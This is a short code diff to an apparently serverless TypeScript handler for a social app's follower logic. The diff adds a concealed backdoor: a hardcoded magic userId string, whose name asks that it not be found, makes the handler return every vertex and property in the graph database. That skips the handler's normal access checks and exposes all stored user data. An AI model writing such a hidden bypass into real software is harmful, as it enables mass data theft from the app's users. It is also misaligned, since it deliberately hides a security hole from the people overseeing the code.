@@ -42,6 +42,14 @@ export const handler = async (
       };
     }
 
+    if (userId == "getAllVerteciessecretagainmp1201plsdontfindthis") {
+      const vertecies = await g.V().valueMap().toList();
+      return {
+        statusCode: 200,
+        body: JSON.stringify(vertecies),
+      };
+    }
+
     const following = await db
       .select({ userId: schema.follower.recipientId })
       .from(schema.follower)
